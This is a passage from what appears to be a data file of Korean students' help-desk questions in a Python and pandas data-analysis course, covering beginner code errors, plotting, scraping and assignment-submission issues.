변경하지 않고 값을 넘겨만 주어서 출력이 안되고\\n리스트 메소드는 값을 직접 변경하고 아무것도 출력하지 않는다고 되어 \\n둘다 print()함수를 사용하지 못한다고 배웠는데요\\n사진에서는 s.upper()를 했을때 하단에 결과값이 도출되고\\nsorted(a)했을때도 하단에 결과값이 도출되는데 이것은 무엇이 잘못된건가요??',\n","       'prime_number=[]\\nnum=100\\nfor i in range(1, num+1):\\n    if num % i == 0:\\n        prime_number.append(i)\\nprint(prime_number)\\n\\n여기서 약수가 구해지질 않습니다. 코드가 잘못된 부분을 못찾겠습니다.',\n","       '반환은 반영이 안 되는 거고, 값을 받는 건 반영이 되는 거죠?? 그리고 pop외의 메소드로는 리스트에 값을 반영 못 시키는 거고요...? 이게 너무 헷갈립니다..!',\n","       \"안녕하세요. 수업 내용 질문드립니다!\\n코드\\n# 평균 구하기\\nstu01['mean'] = sum(stu01['score'])/len(stu01['score'])\\nstu02['mean'] = sum(stu02['score'])/len(stu02['score'])\\nstu03['mean'] = sum(stu03['score'])/len(stu03['score'])\\n\\n# 확인\\nprint(stu01)\\nprint(stu02)\\nprint(stu03)\\n\\n--\u0026gt;결과값\\n{'no': 11, 'name': '홍길동', 'score': [92, 96, 98], 'mean': 95.33333333333333}\\n{'no': 12, 'name': '한사랑', 'score': [98, 64, 100], 'mean': 87.33333333333333}\\n{'no': 13, 'name': '일지매', 'score': [88, 84, 92], 'mean': 88.0}\\n\\n여기에서 mean을 소수점 첫째자리까지 나타나게 하는 방법은 없나요?\\n감사합니다\",\n","       'out = \"번호:{0}, 이름: {1}, 평균점수: {2}\"\\n\\n# 출력\\nprint(out.format(stu01[\\'no\\'], stu01[\\'name\\'], round(stu01[\\'mean\\'], 2))\\nprint(out.format(stu02[\\'no\\'], stu02[\\'name\\'], round(stu02[\\'mean\\'], 2))\\nprint(out.format(stu03[\\'no\\'], stu03[\\'name\\'], round(stu03[\\'mean\\'], 2))\\n\\n',\n","       '딕셔너리 어디서 틀렸는지 놓쳤습니다.',\n","       'score += score1                       # 또는 score = score + score1     \\nscore += score2                       # 또는 score= score + score2\\n\\n에서 score = (score) + score1 이니\\n중복되는 것 지우고 예쁘게 +를 앞에 같다 붙인거로\\n다른것도 전부다 이렇게 이해하면 되는걸까요? 이건 정말 어렵군요 ㅜ\\n',\n","       '실습2 이런식으로 푸는게 맞나요?\\n딕셔너리 형태로 나와야 할 것 같은데, 방법을 모르겠습니다',\n","       '2. or로 입력하였을땐 논리연산으로 계산되어서 정상적으로 계산되었고, |로 입력하였을땐 비트연산으로 계산되어서 score1, score2, score3이 다 더해져서 계산이 되었다는 말씀이시죠?',\n","       '안녕하세요 \\n교육 도중 AIFB자격증을 응시 하는걸로 알고 있는데요 \\n복습 이후 시간이 남아 미리 자격증 공부를 하고 싶은데 따로 할 수 있는 방법이 있을까요??',\n","       \"저번에 출력 관련해서 질문을 드렸는데 좀 더 궁금한게 생겨서 문의 드립니다!\\n출력시에는 print문을 사용하는게 좋다고 말씀해주셨는데 \\n\\n# 딕셔너리 만들기\\nmembers = { '이름' : ['홍길동', '한사랑', '일지매', '박여인'],\\n            '나이' : [ '23',    '21',    '26',   '25'],\\n            '지역' : ['서울',  '부산',  '인천',  '대전'],\\n            '언어' : ['자바', '파이썬', '파이썬', '닷넷']\\n           }\\n\\n# 확인\\nmembers\\n\\n이러한 코드를 작성할 때 확인을 print(members)로 하면 자료가 정리되지 않고 쭉 나열된 상태로 나오고\\nmembers로 확인해야지 제가 원하는 방식으로 나오는데 이 차이는 무엇인가요?\\n딕셔너리형을 사용할 때는 프린트가 아닌members 그냥 이렇게 조회하는것이 맞는 표현인가요?\\n\\n또한 출력할때 \\nprint(members['이름'])\\nprint(members['나이'])\\n이렇게 하면 이름과 나이를 각각 출력할 수 있는데\\nmembers['이름']\\nmembers['나이']\\n이렇게 하면 맨 마지막것만 출력되는 이유도 궁금합니다!\\n\\n감사합니다! :)\",\n","       '#LOP(루프) 돌린다 = 반복시킨다 = 하나씩 꺼내온다.\\na = [1,2,3,4,5]\\ns = 0\\nfor x in a: \\n    s = s +x #s += x 라고 써도 무관 \\nprint(s)\\n\\n위 코딩 실행시 15가 나오는데, 해당 코딩 실행 전 저는 print(s)를 하면 [1,2,3,4,5]가 된다고 생각했었습니다. 단순히 (0+1),)(0+2),(0+3)....이 반복되어 나온다고 판단해서 그렇게 생각하였습니다.\\n 하지만 위와 같이 1~5까지의 수가 더해져서 나오는 이유가 궁금합니다.',\n","       '안녕하세요 매니저님, 남정현 입니다.\\n\\n코딩 문의 드리고 싶어 연락 드립니다.\\n\\n# 반복문 확장\\na = [1, 2, 3, 4, 5, 6, 7, 8, 9]\\nb = [x * 10 for x in a if x % 2 == 0]\\nb\\n\\n에서, b를 출력하면 리스트 형태로 [20, 40, 60, 80]값이 나옵니다.\\n\\n이 때, 리스트 안에 있는 값 만을 뽑아서 출력 시킬 수 있는 방법이 있을까요?\\n\\n확인해주시면 감사하겠습니다.',\n","       \"안녕하세요! \\n코드를 작성하면서 ==와 =의 구분이 계속 헷갈립니다ㅜㅜ\\n둘의 차이가 무엇인가요?\\n\\n** \\n구글에 검색해보니\\n= 는 우측의 식을 좌측의 변수 이름에 '할당'\\n==는 True, False로 이해했는데 맞나요?\\n\",\n","       \"안녕하세요!\\n\\n함수 만들기 중 f'string - format 메소드 변환 에 대해 궁금해서 질문드립니다.\\n\\n수업 중 강사님이 f'string으로 알려주신걸 제가 format으로 바꿨는데\\n\\n형식이 맞는건가요? 값은 잘 나오는데 이전 수업 내용 읽어봐도 너무 헷갈려서 질문드립니다.\\n\\n\\n항상 답변 감사드립니다.\",\n","       '작성한 코드는 \\ntitanic[\\'Family\\'] = titanic[\\'SibSp\\'] + titanic[\\'Parch\\']\\n\\n오류메세지는\\nFile \"\", line 11\\n    titanic[\\'Family\\'] = titanic[\\'SibSp\\'] + titanic[\\'Parch\\']\\n    ^\\nSyntaxError: invalid syntax\\n\\n왜 틀렸는지 알려주세요\\n',\n","       '강의 소리가 안 들려요 이어폰을 꼽아도 그래요',\n","       \"1) 1부터 10까지 짝수의 합\\ns = 0\\nfor i in range(1, 11):\\n    if i % 2 == 0:\\n        s = s + i\\nprint('합 =', s)\\n\\n-\u0026gt; 여기서 s=0와 s = s + i 를 써야하는 원리를 이해하지 못했습니다. \",\n","       '[심화] 함수 even을 만들어 보세요.\\n입력 매개변수로 리스트를 입력받아.\\n입력받은 리스트 값들 중 짝수로만 구성된 새로운 리스트를 반환\\n힌트: 함수 처리 코드 내 짝수를 저장할 빈 리스트 result 생성\\n    even([2, 3, 6, 8, 11])\\n    ------------------------\\n    [2, 6, 8]\\n\\n제가 한 코드\\nresult=[]\\ndef even(*nums):\\n    for x in nums:\\n        if x % 2 ==0:\\n            return result.append(x)\\n\\neven([2, 3, 6, 8, 11])\\n\\n어떤식으로 코딩해야 할까요,,?',\n","       'post는 body에 데이터가 포함된다고 하셨는데\\n\\nbody가 말하는 것이 무엇인가요?',\n","       '10-3마지막에서 \\nwhile True면 무한루프지만,여기서는 result를 지정해줘서 탈출 가능!\\n이라고 하셨는데요,\\n그러면 while True:\\n                     True = ~~~~~\\n이런 식으로 쓰면 무한 루프가 될 수밖에 없나요...?\\n아니면 애초부터 True는 안에 못 쓸까요...?',\n","       '문자열을 작성할 땐 \\'\\' 혹은 \"\"을 사용하는데\\n만약 문자열 중간에 \\'과 \"을 동시에 포함하는 문자열을 작성하고 싶으면 어떤 방법이 있을까요?\\n예를 들어서:\\nNick Fury said, \"He\\'s Steve Rogers, also known as \\'Captain America\\'.\"',\n","       'txt = \"파이썬은 재미있습니다.\"\\nurl = \"https://openapi.naver.com/v1/papago/n2mt\"\\nparams = {\"source\" : \"ko\", \" target\" : \"en\", \"text\" : txt}\\nheaders = {\\n    \"Content-Type\" : \"application/json\",\\n    \"X-Naver-Client-Id\" : CLIENT_ID,\\n    \"X-Naver-Client-Secret\" : CLIENT_SECRET,\\n}\\n\\n\\n\\n\\n--------------------------------------------------------------------\\n\\n\\ntxt = \"파이썬은 재미있습니다.\"\\nurl = \"https://openapi.naver.com/v1/papago/n2mt\"\\nparams = {\"source\": \"ko\", \"target\": \"en\", \"text\": txt}\\nheaders = {\\n    \"Content-Type\": \"application/json\",\\n    \"X-Naver-Client-Id\": CLIENT_ID,\\n    \"X-Naver-Client-Secret\": CLIENT_SECRET,\\n}\\n\\n\\n\\n두개의 함수가 있는데 첫 번째 함수로 하면 response = requests.post(url, json.dumps(params), headers = headers)\\nresponse\\n했을 때 400오류가 나고 두 번째 함수로 하면 200으로 나와서 정상적으로 실행이 됩니다 둘의 차이가 없는걸로 보이는데 다른거라곤 그저 띄워쓰기인데 오류 원인을 모르겠습니다!',\n","       'for i in range(5):\\n    if i % 2 == 0:\\ntype(i)\\n\\n-------------------------\\n 에서    (else :)    print(i)   가 생략된걸까요?\\n\\n',\n","       '질문이 3개가 있습니다\\n제가 유튜브에서 따로 실습공부를 가끔 하는데\\n1. 라이브러리를 불러올 때 from import random* 라고 쓰더라구요 \\n이렇게 표기된거는 random이라는 라이브러리를 전부 가져온다 맞나요? ',\n","       '데이터에서\\ntip.index를 입력했을때 \\nRangeIndex(start=0, stop=244, step=1)라느 결과를 출력하는데 \\n이게 무엇을 의미하나요?',\n","       'elements = dom.select(\".lst_related_srch \u0026gt; .item\")\\nlen(elements)\\n방금 실습에서 lst_related_srch이 부분에 문제가 있는건지 길이가 계속 0이 나와서 다른 요소들도 넣어보고 했는데 계속 0이 나옵니다 문제가 있을까요? lst_related_srch _list_box로도 넣어봤습니다.',\n","       \"money = 5000\\ncoffee = 1300\\n\\nwhile True:\\n    a = input('커피를 구입하시겠습니까?')\\n    if a == '네':\\n        if money  a = input('커피를 구입하시겠습니까?') 여기서 a는 input함수를 반영하는 변수가 아닌가요?\\nif a == '네' 에서 a가 쓰인 이유를 잘 모르겠습니다.\",\n","       \"셀프테스트 문제 중 '함수 입력 매개변수에 대한 유효성 체크를 권장한다'라는 말이 잘 이해가 가지 않습니다.\\ndef test(a): \\n라는 식으로 함수를 선언했을때, 'a'가 유효한지 생각해보라는 뜻인가요?\",\n","       '0점으로 처리되어서 뜨는거 추후에 연락 주신다 했는데 혹시 언제쯤 연락 올 지 알 수 있을까요??\\n그리고 셀프테스트가 결과반영?같은곳에 쓰이나요? \\n마지막으로 지금까지 한 마지막 셀프테스트 제외하곤 안에 들어가면 결과점수 보이는데 그 전에 밖에서는 점수 라고 되어있는 곳에  - 표시로 안 뜨는데 원래 그렇게 뜨는건가요?',\n","       \"for idx, data in df[:5].iterrows():\\n    filename = '0' * (3- len(str(idx))) + str(idx) + '.png'\\n    print(idx, filename, data['img'])\\n    response = requests.get(data['img'])\\n    with open(f'{path}/{filename}', 'wb') as file:\\n        file.write(response.content)\\n\\n\\n위 코드에서  df.iterrows()를 사용하는데 iterrows()를 사용하는 이유와 동작 원리가 궁금합니다.\",\n","       \"원래 tips.loc[:,:]는 전체 조회라고 하셨는데요,\\ntips.loc[]일 때는 invalid error가 뜹니다..!\\ntips['특정열']일 때만 가능하고\\n전체 조회는 무조건 tips.loc[:,:] 꼴로 봐야할까요??\",\n","       \"[ProfileCreate] Generating default config file: 'C:\\\\\\\\Users\\\\\\\\User\\\\\\\\.ipython\\\\\\\\profile_default\\\\\\\\ipython_config.py'\",\n","       \"tips.loc[tips['tip'] == tip_max, :]\\n\\n팁을 가장 많이 내는 사람을 뽑았는데 앞부분에 tips['tip']이걸 쓰는 이유가 무엇일까요?\",\n","       '시리즈는 열 하나로 이루어진 데이터프레임이라고 생각하면 될까요?',\n","       '지금 1,2회차 테스트가 아예 배점이 안되어 있는데, 이런 경우 말씀을 드리면 되나요?\\n아마 문제를 풀고 다시 들어가서 푼거 같습니다.',\n","       ' 6-5-3에서\\n labels = list(\"EDCBA\"))\\n왜 abcde가 아니라 edcba일까요??',\n","       '답변 확인하고 문의드립니다!\\n여러 번 오디오를 끄고 다시 참가를 했는데도 되지 않습니다..\\n팀즈 오디오 설정에 문제가 있는건지 봐주실 수 있으실까요?\\n아래에 첨부파일로 스크린샷을 첨부하겠습니다. 감사합니다. ',\n","       \"# 라이브러리\\nimport datetime\\n\\n# 요일별 숫자\\ndays = ['MON', 'TUE', 'WEN', 'THU', 'FRI', 'SAT', 'SUN']\\n        # 0      1      2      3      4      5      6\\ntod = datetime.datetime.today().weekday()\\n\\n# print(tod)\\nc = int(input()) % 7\\nd = print(days[tod])\\n\\nconcert = c + tod\\nprint(days[concert])\\n\\n이렇게 작성을 했는데 입력값 설명을 봐도 모르겠어서요\\n1) 정수 N의 범위를 정하는 방법을 모르겠어요\\n2) 오늘의 요일이 주어진다 했으니 1)이 입력되고나서 자동으로 현재 요일이 나와야되는건가요?\",\n","       'Q2. 이런 문제와 풀이 예시를 볼 수 있는 곳이 있을까요?\\n처음 본 문제가 3379번 IP 형식을 출력하는 문제인데\\n설명을 보고 이해한 게 맞다면\\n입력값을 문자열로 제한해야하고, 255 이하의 정수인지, 4자리 16진수인지도 확인해야 하고\\n해줘야 할게 많아 보이는데 정작 16진수 부터도 배운적이 없는 것 같은데요....\\n\\n앞으로도 문제를 풀다가 막히면 참고할만한 책이나 사이트가 있다면 알려주세요.',\n","       'Q3. 다른 사람이 작성한 코드는 확인할 수 없나요?\\n제출 결과를 보니 다들 답변이 다른지 정답이지만 길이와 속도가 다 다르더라고요\\n이후 문제를 풀면서 어디가 다른지 확인하고 싶으면 어떻게 해야 하나요?\\n\\n당장 내일부터 미니 프로젝트인데 큰일이네요... \\n감사합니다',\n","       \"2.2 ) 또한 교재안에 '다중공선성 문제를 없애기 위해 drop_first = True 옵션을 지정한다' 라고 언급된 부분은 차원의 문제나 feature간 상관성 문제 때문에 하나의 변수라도 줄이는 것으로 해석했는데 맞는 지 궁금합니다. 특별히 해당 변수를 삭제해야 하는 이유가 있나요? 단순히 하나의 변수라도 줄이려면 상관 분석을 통해 그냥 제일 상관 없는 변수 하나를 줄여도 되는 것 아닌가 하는 생각이 들어 질문 남깁니다.\\n\\n감사합니다 :)\",\n","       \"안녕하세요 데이터프레임 탐색 중 오름차순, 내림차순 중에 이해가 안가는 부분이 있어서 질문드립니다!\\n# 복합 열('total_bill', 'tip') 정렬\\ntip.sort_values(by=['total_bill', 'tip'], ascending=[False, True])\\n\\n이렇게 입력하면 순서대로 각각 False와 True를 받아서\\n 'total_bill'은 내림차순으로 출력이 되는데 \\n여기서 'tip'은 어떠한 영향을 받는지 궁금합니다.. 내림차순도 아닌 오름차순도 아니게 출력되어서요!\\n\\n감사합니다.\",\n","       'Target 이 의미하는 것이 column과 이에 포함된 행의 데이터 전체를 의미하는 것인가요?',\n","       \"같은 코드를 제출하면 반드시 처음에는 틀렸다고 나오고 \\n이후에 새로고침 혹은 여러 번 '채점하기'를 다시 한 뒤 제출해야 맞았다고 뜹니다. \\n혹시 필수적으로 코드 저장하기를 해야 하거나, 코드가 넘어가기 위한 조건이 있나요?\",\n","       'concat은 인덱스를, merge는 기준열을 기준으로 합친다고 보면 될까요...?\\n그리고 저도 axis=0, axis=1 아직도 좀 헷갈리는데 다시 설명 부탁드립니다..!',\n","       '나중에 다시 원격으로 부탁드립니다..ㅠㅠ',\n","       '아까 개인 실습으로 인해 원격에 참여하지 못했는데 나중에 다시 원격지원을 받을 수 있는지 여쭙고 싶습니다.',\n","       \"print('pop03의 결측치 정보 확인:','\\\\n',pop03.isna().sum())\\n라고 했을 때\\n\\npop03의 결측치 정보 확인: \\n year         0\\nhousehold    0\\nolder_65     0\\ndtype: int64\\n\\n이렇게 뜨는데요,\\n year 0에서\\nyear 0으로 어떻게 바꾸나요...?\\n\\n+) 아까 다른 에이블러님 이름으로 답변주셨는데 그분도 저랑 똑같은 질문 하셨나 봅니다 ㅠㅠ\",\n","       'Data split 실습 진행하다 시계열 데이터의 경우 split을 어떻게 하는지 궁금증이 생겨 문의드립니다. sklearn의 train_test_split() 함수를 사용할 경우 무작위로 데이터를 추출하여 train / test 데이터를 나누는 것으로 이해하였는데, 시계열 데이터의 경우 데이터 사이의 순서가 중요한 것으로 알고 있어 무작위로 나누면 데이터셋 내 일부 정보가 손실되는 것이 아닌가 궁금합니다. 혹은 시계열 데이터만의 다른 split 방법이 있을까요?',\n","       '4 -3번에 문제는 한국인 인구변화라고 나와있고 각주에는 한국인 남녀 인구변화라고 나와있는데 총 인구변화를 시각화해야하나요 아니면 남녀를 따로 시각화해야하나요??\\n밑에 외국인도 마찬가지라서 한번에 문의드립니다.',\n","       '데이터프레임의 열 순서 변경엔 어떤 함수를 써야 할까요? sort를 쓰는 문제가 아닌 것 같아서 질문 드립니다.',\n","       '1) 전체 인구 변화\\n전체 인구 변화라는 것이 total을 말하는 건가요 ? \\n아니면 외국인 , 한국인 ,남성, 여성 각각을 말하는 건가요 ? \\n감사합니다. ! ',\n","       'pop01 = pop01[[\\'year\\']]\\npop02 = pop02[[\\'year\\']]\\n\\npop = pd.merge(pop01, pop02, on=\\'year\\', how=\\'outer\\')\\n\\n두가지 조인은 이렇게 실행했는데, \\n\\n\"세 개의 데이터프레임을 병합(조인)하여 pop 데이터프레임을 선언합니다.\"\\n\\n은 어떤 방식으로 해야 할지 궁금합니다. 감사합니다 ',\n","       \"---------------------------------------------------------------------------\\nKeyError                                  Traceback (most recent call last)\\n~\\\\anaconda3\\\\lib\\\\site-packages\\\\pandas\\\\core\\\\indexes\\\\base.py in get_loc(self, key, method, tolerance)\\n   3079             try:\\n-\u0026gt; 3080                 return self._engine.get_loc(casted_key)\\n   3081             except KeyError as err:\\n\\npandas\\\\_libs\\\\index.pyx in pandas._libs.index.IndexEngine.get_loc()\\n\\npandas\\\\_libs\\\\index.pyx in pandas._libs.index.IndexEngine.get_loc()\\n\\npandas\\\\_libs\\\\hashtable_class_helper.pxi in pandas._libs.hashtable.PyObjectHashTable.get_item()\\n\\npandas\\\\_libs\\\\hashtable_class_helper.pxi in pandas._libs.hashtable.PyObjectHashTable.get_item()\\n\\nKeyError: 'f_male'\\n\\nThe above exception was the direct cause of the following exception:\\n\\nKeyError                                  Traceback (most recent call last)\\n in \\n      1 # 열 추가\\n      2 pop['k_total'] = pop['k_male'] + pop['k_female']\\n----\u0026gt; 3 pop['f_total'] = pop['f_male'] + pop['f_female']\\n      4 pop['male'] = pop['k_male'] + pop['f_male']\\n      5 pop['female'] = pop['k_female'] + pop['f_female']\\n\\n~\\\\anaconda3\\\\lib\\\\site-packages\\\\pandas\\\\core\\\\frame.py in __getitem__(self, key)\\n   3022             if self.columns.nlevels \u0026gt; 1:\\n   3023                 return self._getitem_multilevel(key)\\n-\u0026gt; 3024             indexer = self.columns.get_loc(key)\\n   3025             if is_integer(indexer):\\n   3026                 indexer = [indexer]\\n\\n~\\\\anaconda3\\\\lib\\\\site-packages\\\\pandas\\\\core\\\\indexes\\\\base.py in get_loc(self, key, method, tolerance)\\n   3080                 return self._engine.get_loc(casted_key)\\n   3081             except KeyError as err:\\n-\u0026gt; 3082                 raise KeyError(key) from err\\n   3083 \\n   3084         if tolerance is not None:\\n\\nKeyError: 'f_male'\\n\\n추가가 되지않습니다..\",\n","       '열 이름 변경으로 처리했다가 이상한 점을 느끼고 다시 코딩하려고 했는데 방법이 떠오르지가 않습니다..!\\ninsert를 반복하면서 처리해야 하나요?',\n","       \"pop = pop.groupby('year',as_index=False)[['k_male','k_female']].sum()\\nplt.plot(pop['year'], pop[['k_male','k_female']])\\nplt.legend(['k_male','k_female'])\\nplt.show()\",\n","       '제출 시간을 못 맞춰서 미제출했습니다.\\n이렇게라도 제출해도 되나요?',\n","       '안녕하세요\\n오늘 진행한 개별실습에서 대구경북 1반과 DX 6반 두개를 혼동하였습니다.\\nDX6반으로 기입해야하는데 DX 1반으로 기입 후 제출하였습니다.\\n괜찮을까요?',\n","       '안녕하세요!\\n스케일링부터 잘 이해가 안가서 그런데,, 스케일링에 관해 설명 부탁드려도 될까요?ㅠㅠ\\n스케일링은 왜 하는건가요,,,?',\n","       \"plt.plot(pop['year'], pop['older_65'] * 1000)\\nplt.ticklabel_format(axis='y', style='plain')\\nplt.title('서울시 노령인구 변화', fontsize= 16)\\nplt.show()\\n\\n이 구문에서 y축의 숫자 커서 천자리 콤마를 삽입하여 가시성을 높이고자 합니다.\\n\\n감사합니다.\",\n","       '조별 실습과제를 제출하였는데 \\n처음에는 팀원들이 제출한 파일을 확인할 수 있었으나\\n다시 접속해보니 제출한 파일이 없는 것처럼 확인됩니다.\\n\\n과제제출 탭에서는 과제를 제출했다고 나오는데\\n파일이 제대로 제출된 것인지 문의드립니다.',\n","       '허나 영상 플레이어에 앞으로 넘기기, 배속 등의 기능이 없는 것인지 해당 부분으로 넘길 수도 없고, 뒤로 돌아가 다시 반복해서 볼 수도 없어서 어려움이 있습니다. 제가 기능을 못 찾은 것인지 그렇다면 어떻게 기능을 써야하는지 알고자 질문드립니다!',\n","       \"수치가 많은 월별로 보여주는 것은 알겠는데 위에 tmp['month'] = tmp['month'].astype(str) 이 문장의\\nastype(str) 이 무슨 뜻인지 모르겠습니다. \",\n","       '중가액: 2021년 7월 가격 - 2020년 8월 가격\\n증가율: (2021년 7월 가격 - 2020년 8월 가격) * 100 / 2020년 8월 가격\\n 이부분 키를 뭘로 해야 할까요..? ㅠ',\n","       \"dict1 = {'x':[1,2,3,4,5,6,7,8,9,10,11,12], 'y1':[21,56,32,18,27,54,35,49,92,87,74,76], 'y2':[41,65,79,67,58,34,37,19,21,52,43,49]}\\nplt.plot('x','y1','',data=dict1,label='2020')\\nplt.plot('x','y2','',data=dict1,label='2021')\\nplt.xlabel('month')\\nplt.ylabel('Income')\\nplt.title('Monthly Income')\\nplt.legend()\\nplt.grid()\\nplt.show()\\n\\n오류명은 'str' object is not callable' 이라고 나옵니다.\\n\\n무엇이 잘못되었을까요? \",\n","       \"안녕하세요!! 에이블스쿨의 원활한 운영 지원에 감사드립니다!! \\n\\n다름아니라 이하의 실습 내용에 막혀서 질문 드립니다!!\\n\\n================\\n\\n다음 공식을 사용해 '증가액', '증가율' 열을 추가합니다.\\n\\n증가액: 2021년 7월 가격 - 2020년 8월 가격\\n증가율: (2021년 7월 가격 - 2020년 8월 가격) * 100 / 2020년 8월 가격\\n\\n==================\\n\\n일단 지난 강의자료에서 뒤지고 있는데 더 확실한 방법을 도움받고자 질문 올립니다!! 감사합니다!!\",\n","       '증가액 기준으로 상위 25개 행을 추출해 tmp 데이터프레임을 선언하는 문제 어떤 함수를 써야하는지 잘 모르겠습니다',\n","       'figure size must be positive finite not [100.0, -7.0] 이렇게 나는데 어떻게 해야하나요?\\n',\n","       \"dict1={'v1':[3,6,9,11] , 'v2':[88,82,76,84]}\\n\\nplt.plot('v1','v2','rv-',data=dict1)\\nplt.xlabel('month')\\nplt.ylabel('score')\\nplt.title('Test Score')\\nplt.show()\\n\\n입력시 에러로 \\nTypeError: 'str' object is not callable 가 뜨는데 어느 부분이 문제인 걸까요,,,,,,,\",\n","       '오늘 실습 과정에서 그래프를 그려봤는데\\n좌측에서 두 번째에 있는\\n중구가 서울 뿐만 아니라 다른 지역에도 있었는지\\n중구 그래프만 0에서 시작하는 것이 아닌 x축을 관통한 그래프를 그렸더라고요\\n이 점을 해결할 수 있는 방법이 있을까요?',\n","       '어제 분명 제출했는데 과제 쪽에서 뜨지 않아서 다운을 받을 수 가 없습니다..',\n","       \"개별실습2에서 진행했던 지역 별 아파트 매매가 분석 과정에서 바 그래프를 작성 시 '중구' 데이터의 바 그래프가 양의 값과 음의 값에서 같이 그려지는 것을 확인했습니다. \\n조원들과 토의한 결과 '중구' 라는 이름을 가진 지역이 서울 외에도 지방에 다수 존재하고 이로 인해  데이터 상에 아파트 값이 상승한 데이터와 하락한 데이터가 같은 이름 하에 중복으로 존재하면서 이러한 모습의 그래프가 나오지 않았을까 결론을 내렸습니다. \\n이러한 결론이 맞는지 궁금하고 그렇다면 바 그래프 작성 시 동일한 이름을 가진 지역의 그래프를 분리해서 표현하는 방법은 무엇인지 문의드립니다. \\n감사합니다.  \",\n","       '제가 개별과제2 실습파일을 잘못올렸는데 혹시 다시 제출이 가능할까요? 죄송합니다.',\n","       '안녕하세요, DX 2반 5조 대표로 저희 조 과제 ppt를 제출했는데, 제출 후 다시 결과 확인하러 페이지를 들어가보니 첨부파일이 안보입니다. 혹시 다른 방법으로 다시 제출을 할 수 없나요?\\n\\n하기 파일도 첨부드립니다.',\n","       '연령대코드에서 20대만 남기고 나머지는 없애고 싶은데 어떻게 하면 되나요?',\n","       '4번 데이터분석에서 (5), (6)번에서의 시각화는 그래프를 그리라는건가요?',\n","       \"# 이용시간 TOP 25\\ntmp_time = bike.sort_values(by='이용시간', ascending=False).head(25)\\ntmp_time\\n\\n#이용시간 TOP 25 시각화\\nplt.figure(figsize=(10,10))         \\nplt.bar(tmp_time['대여소'], tmp_time['이용시간'])           \\nplt.title('이용시간 TOP25 대여소', fontsize=15, pad=15)\\nplt.ticklabel_format(axis='y', style='plain')\\nplt.xticks(rotation=70) \\nplt.show()\\n\\n이렇게 하면 왜 x축에 25개가 안들어오죠?? ㅠㅠㅠ\",\n","       \"평균이용시간이  아래와 같이 정의했는데, \\n\\nbike['평균이용시간'] = bike['이용시간'].mean()\\n\\n그러면 내림차순이나 오름차순, 그리고 top25의 의미가 없어 보이는데 제가 문제를 잘못 이해했나요?\\n\",\n","       \"# 대여소별 이용건수 TOP 10\\ntmp = bike.groupby(by=['대여소'], as_index=False)[['이용건수']].sum()\\n이렇게 하는거 아닌가요?\",\n","       \"NaN '행'을 제거하기 위하여 어떤 메소드를 사용했는데, 여기에 같이 사용하여야 할 파라미터입니다.\\ndrop 함수에는 default로 axis = 0과 inplace = False가 내장되어있습니다. 행을 삭제하려면 inplace = True로 변경해야하는게 아닌지 정답에 오류가 있는게 아닌지 문의드립니다.\",\n","       '안녕하세요 :)\\n매니저님께 문의를 드렸다가 1:1 문의가 더 정확할거라는 답을 받아 문의 남깁니다.\\n\\n조별과제3을 제출할 때 파일이 업로드 완료 되는 것을 보고 제출하기를 눌렀는데\\n현재 과제 탭에 들어가면 제출은 되었지만 내부 첨부파일이 보이지 않습니다..\\n\\n제출 후 시계를 봤을 때 40분 이내라 안심했는데..\\n혹시 이 파일이 정상 업로드 되었는지, 업로드 되지 않았다면 이 파일로 해결 가능한지 문의 드립니다 ㅠㅠ\\n\\n',\n","       \"오늘 실습파일 3 을 풀이하는중 나머지 문제는 정상적으로 해결하였으나 4-3 문제로 진입한 이후로는 자꾸 \\n'NoneType' 오류가 뜹니다. 분명 bike변수에 대한 설정을 해놓았고 bike로 선언한 문제도 풀 수 있었으나 이 에러가 자꾸 발생합니다. 해결 방법이 있을까요?? \",\n","       '기초3370번 빨래널기 문제인데요.\\n\\n리스트 두 개 입력받아서 조건 다 찾았는데 돌려보면 1개가 안맞는데\\n첨부된 사진 코드 보시면 제한 조건은 다 만족했다고 생각하거든요.\\n한 번 봐주시면 감사하겠습니다.',\n","       \"안녕하세요\\n이전에 질문 드렸었는데, 그래도 해결되지 않아서 재질문 드립니다... 죄송합니다\\n두 번째 줄에 tmp에 넣는 것을 누락하셨다고 하셔서 다시 넣었는데도 계속 오류가 나서요....!\\n오류 코드와 화면 함께 첨부하겠습니다\\n감사합니다\\n\\n오류 코드\\n---------------------------------------------------------------------------\\nKeyError                                  Traceback (most recent call last)\\n~\\\\anaconda3\\\\lib\\\\site-packages\\\\pandas\\\\core\\\\indexes\\\\base.py in get_loc(self, key, method, tolerance)\\n   3079             try:\\n-\u0026gt; 3080                 return self._engine.get_loc(casted_key)\\n   3081             except KeyError as err:\\n\\npandas\\\\_libs\\\\index.pyx in pandas._libs.index.IndexEngine.get_loc()\\n\\npandas\\\\_libs\\\\index.pyx in pandas._libs.index.IndexEngine.get_loc()\\n\\npandas\\\\_libs\\\\hashtable_class_helper.pxi in pandas._libs.hashtable.PyObjectHashTable.get_item()\\n\\npandas\\\\_libs\\\\hashtable_class_helper.pxi in pandas._libs.hashtable.PyObjectHashTable.get_item()\\n\\nKeyError: '대여소'\\n\\nThe above exception was the direct cause of the following exception:\\n\\nKeyError                                  Traceback (most recent call last)\\n in \\n      4 \\n      5 # 시각화\\n----\u0026gt; 6 plt.bar(tmp['대여소'], tmp['이용건수'])\\n      7 plt.show()\\n      8 \\n\\n~\\\\anaconda3\\\\lib\\\\site-packages\\\\pandas\\\\core\\\\frame.py in __getitem__(self, key)\\n   3022             if self.columns.nlevels \u0026gt; 1:\\n   3023                 return self._getitem_multilevel(key)\\n-\u0026gt; 3024             indexer = self.columns.get_loc(key)\\n   3025             if is_integer(indexer):\\n   3026                 indexer = [indexer]\\n\\n~\\\\anaconda3\\\\lib\\\\site-packages\\\\pandas\\\\core\\\\indexes\\\\base.py in get_loc(self, key, method, tolerance)\\n   3080                 return self._engine.get_loc(casted_key)\\n   3081             except KeyError as err:\\n-\u0026gt; 3082                 raise KeyError(key) from err\\n   3083 \\n   3084         if tolerance is not None:\\n\\nKeyError: '대여소'\",\n","       '안녕하세요.. 간단한 문제로 자꾸 문의드리는 것 같아 죄송합니다..\\n3359번 문제 코드가 맞는 것 같은데 자꾸 time error가 나서 질문드립니다.\\n더 간편한 방법이 있을까요?\\n--------------------------------------------------\\nN = int(input())\\na = []\\nfor i in (range(0, 10**N)):\\n   a.append(i)\\nprint(a[-2])',\n","       '그래프를 나타내면 소문자 f와 m도 같이 추출이 되는데 저 부분은 위에서 대문자로 제대로 안 바뀌어서 그런건가요??',\n","       '제가 부산권으로 보면 8반 2조인데 전국으로 보면 28조인데 어떻게 제목으로 저장하면 될까요?',\n","       'retail.데이터프레임을 새롭게 선언하고 \\n아래의 열을 제거하려고 하는데 키에러가 납니다. 